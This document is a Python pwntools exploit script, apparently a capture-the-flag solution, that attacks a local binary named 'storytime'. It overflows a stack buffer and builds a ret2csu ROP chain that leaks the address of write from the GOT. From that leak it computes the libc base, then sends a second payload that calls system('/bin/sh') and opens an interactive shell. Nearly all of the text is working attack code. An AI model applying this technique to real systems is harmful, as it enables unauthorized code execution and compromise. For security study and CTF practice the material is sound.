from pwn import *

gdbcmds = '''
b *main+99
b *climax
c
'''

elf = context.binary = ELF("./storytime")
libc = elf.libc
#target = gdb.debug('./storytime', gdbscript=gdbcmds)
target = process("./storytime")


'''0x004006fa POP RBX, POP RBP, POP R12, POP R13, POP R14, POP R15, RET
   0x004006e0 MOV RDX,R15, MOV RSI,R14, MOV EDI,R13D CALL qword ptr [R12 + RBX*0x8]
'''

payload = b""

payload += b"\x90"*56
payload += p64(0x004006fa)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(0x601018) # r12 = write@got
payload += p64(0x1) # r13
payload += p64(0x601018) # r14 = write@got
payload += p64(0x08) # r15

payload += p64(0x004006e0) # mov
payload += p64(0x0) # random pops
payload += p64(0x1) 
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0040060e) # climax function to read input again

print("Len of payload: ", len(payload))
target.recvuntil(b":")
target.sendline(payload)

target.recvline()
write_leak = target.recv()[:8]
write_leak = u64(write_leak)
print("Libc leak:", hex(write_leak))

libc.address = write_leak - libc.sym.write
payload = b""
payload += b"\x90"*56
payload += p64(0x000000000040048e) # ret
payload += p64(0x0000000000400703) # pop rdi; ret
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym.system)

target.sendline(payload)
target.interactive()
